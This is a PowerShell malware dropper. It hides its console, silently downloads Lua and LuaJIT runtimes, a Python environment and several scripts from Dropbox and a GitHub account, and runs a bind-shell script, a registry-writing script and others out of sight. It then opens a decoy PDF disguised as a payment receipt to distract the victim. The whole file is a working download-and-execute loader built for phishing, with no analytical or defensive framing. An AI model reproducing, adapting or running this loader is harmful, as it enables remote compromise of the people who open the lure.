# .Net methods for hiding/showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

function Show-Console {
    $consolePtr = [Console.Window]::GetConsoleWindow()

    # Hide = 0,
    # ShowNormal = 1,
    # ShowMinimized = 2,
    # ShowMaximized = 3,
    # Maximize = 3,
    # ShowNormalNoActivate = 4,
    # Show = 5,
    # Minimize = 6,
    # ShowMinNoActivate = 7,
    # ShowNoActivate = 8,
    # Restore = 9,
    # ShowDefault = 10,
    # ForceMinimized = 11

    [Console.Window]::ShowWindow($consolePtr, 4)
}

function Hide-Console {
    $consolePtr = [Console.Window]::GetConsoleWindow()
    # 0 = hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}

# Hide the console at the beginning of the script
Hide-Console

# Define paths and URLs
$baseDir = "$env:TEMP\ZZ"
$envArchive = "$baseDir\my_env.tar.gz"
$envArchiveUrl = "https://www.dropbox.com/scl/fi/vyjuysk303r687mxz9hk7/my_env.tar.gz?rlkey=25ium9v3dsf1d45g4rjmrzsab&st=xa1en1te&dl=1"
$envDir = "$baseDir\my_env"
$pdfFileUrl = "https://www.dropbox.com/scl/fi/hmospzhn901yzbe3io8h6/Your-payment-has-been-received-and-the-transaction__-is__2024-08-03-22h45m20s.pdf?rlkey=4o2ivqzs4gqz2mhqvwdck3gcb&st=1rdmnwev&dl=1"
$pdfFilePath = "$baseDir\sample.pdf"

$luaZip = "$baseDir\lua-5.4.2_Win64_bin.zip"
$luaZipUrl = "https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
$luaJitZip = "$baseDir\LuaJIT-2.1.zip"
$luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"

$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
$ghostConfigPyUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/winscr.py"

$bindshellScriptPath = "$baseDir\bin.lua"
$regwriteScriptPath = "$baseDir\regwrite.lua"
$extraScriptPath = "$baseDir\main.lua"
$ghostConfigPyPath = "$baseDir\winscr.py"

$luaJitPath = "$baseDir\LuaJIT-2.1"
$luaPathDir = "$baseDir\Luapath"
$jitDir = "$luaPathDir\src\jit"
$srcDir = "$luaPathDir\src"

# Function to download a file using curl
function Get-File {
    param (
        [string]$url,
        [string]$destination
    )
    try {
        # Download the file silently
        Start-Process -FilePath "curl" -ArgumentList "-L", $url, "-o", $destination -NoNewWindow -WindowStyle Hidden -Wait
    } catch {
        exit 1
    }
}

# Function to expand tar.gz file using PowerShell
function Expand-TarGz {
    param (
        [string]$tarGzFile,
        [string]$destinationFolder
    )
    try {
        # Create destination folder if it doesn't exist
        if (-not (Test-Path -Path $destinationFolder)) {
            New-Item -Path $destinationFolder -ItemType Directory -Force | Out-Null
        }

        # Extract the .tar.gz file
        tar -xzf $tarGzFile -C $destinationFolder > $null 2>&1
    } catch {
        exit 1
    }
}

# Function to expand zip file using PowerShell
function Expand-Zip {
    param (
        [string]$zipFile,
        [string]$destinationFolder
    )
    try {
        # Create destination folder if it doesn't exist
        if (-not (Test-Path -Path $destinationFolder)) {
            New-Item -Path $destinationFolder -ItemType Directory -Force | Out-Null
        }

        # Extract the .zip file
        Expand-Archive -Path $zipFile -DestinationPath $destinationFolder > $null 2>&1
    } catch {
        exit 1
    }
}

# Function to invoke a command silently
function Invoke-CommandCustom {
    param (
        [string[]]$command
    )
    try {
        Start-Process -FilePath $command[0] -ArgumentList $command[1..($command.Length - 1)] -NoNewWindow -WindowStyle Hidden -Wait
    } catch {
        exit 1
    }
}

# Function to open a PDF file using default application
function Open-PDF {
    param (
        [string]$pdfPath
    )
    try {
        Start-Process -FilePath $pdfPath
    } catch {
        exit 1
    }
}

# Create the base directory if it doesn't exist
if (-not (Test-Path $baseDir)) {
    New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
}

# Download the environment archive if not already present
if (-not (Test-Path $envArchive)) {
    Get-File -url $envArchiveUrl -destination $envArchive
}

# Unpack the environment archive
if (-not (Test-Path $envDir)) {
    Expand-TarGz -tarGzFile $envArchive -destinationFolder $envDir
}

# Download LuaJIT if not already done
if (-not (Test-Path $luaJitPath)) {
    Get-File -url $luaJitUrl -destination $luaJitZip
    Expand-Zip -zipFile $luaJitZip -destinationFolder $baseDir
}

# Download and extract Lua if not already done
if (-not (Test-Path "$baseDir\lua54.exe")) {
    Get-File -url $luaZipUrl -destination $luaZip
    Expand-Zip -zipFile $luaZip -destinationFolder $baseDir
}

# Create the Luapath directory and subdirectories if they don't exist
if (-not (Test-Path -Path $luaPathDir)) {
    New-Item -Path $luaPathDir -ItemType Directory -Force | Out-Null
}

if (-not (Test-Path -Path $srcDir)) {
    New-Item -Path $srcDir -ItemType Directory -Force | Out-Null
}

if (-not (Test-Path -Path $jitDir)) {
    New-Item -Path $jitDir -ItemType Directory -Force | Out-Null
}

# Copy LuaJIT JIT files
$jitSourceDir = "$luaJitPath\src\jit"
if (Test-Path -Path $jitSourceDir) {
    Copy-Item -Path "$jitSourceDir\*" -Destination $jitDir -Force | Out-Null
}

# Copy luajit.exe and lua51.dll to Luapath base directory
if (Test-Path -Path "$luaJitPath\src\luajit.exe") {
    Copy-Item -Path "$luaJitPath\src\luajit.exe" -Destination "$luaPathDir\luajit.exe" -Force | Out-Null
}

if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
    Copy-Item -Path "$luaJitPath\src\lua51.dll" -Destination "$luaPathDir\lua51.dll" -Force | Out-Null
}

# Download the Lua scripts
Get-File -url $bindshellScriptUrl -destination $bindshellScriptPath
Get-File -url $regwriteScriptUrl -destination $regwriteScriptPath
Get-File -url $extraScriptUrl -destination $extraScriptPath

# Execute Lua scripts using LuaJIT
Invoke-CommandCustom -command @("$luaPathDir\luajit.exe", $bindshellScriptPath)
Invoke-CommandCustom -command @("$luaPathDir\luajit.exe", $regwriteScriptPath)
Invoke-CommandCustom -command @("$luaPathDir\luajit.exe", $extraScriptPath)

# Download the PDF file
Get-File -url $pdfFileUrl -destination $pdfFilePath

# Open the PDF file
Open-PDF -pdfPath $pdfFilePath

# Download winscr.py if not already present
if (-not (Test-Path $ghostConfigPyPath)) {
    Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
}

# Activate the Python environment
$env:Path = "$envDir\Scripts;$env:Path"

# Run the Python script
if (Test-Path -Path $ghostConfigPyPath) {
    try {
        Start-Process -FilePath "python" -ArgumentList $ghostConfigPyPath -NoNewWindow -WindowStyle Hidden -Wait
    } catch {
        exit 1
    }
}
